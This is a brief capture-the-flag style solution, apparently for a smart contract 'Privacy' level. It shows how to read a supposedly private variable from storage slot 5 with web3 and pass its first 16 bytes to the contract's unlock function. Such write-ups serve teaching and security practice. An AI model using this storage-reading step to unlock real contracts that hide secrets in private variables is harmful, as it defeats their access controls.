# Logic

Even if the variables are private, they still can be read. The key is to know how the packaging state memory is done.

# Solution

Get the slot storage where data[2] is stored

```
await web3.eth.getStorageAt(contract.address,5)
```

Convert the result from `bytes32` to `bytes16` as the function `unlock` requires. Just split in 2 the string

```
await contract.unlock(<response_in_16_bytes>)
```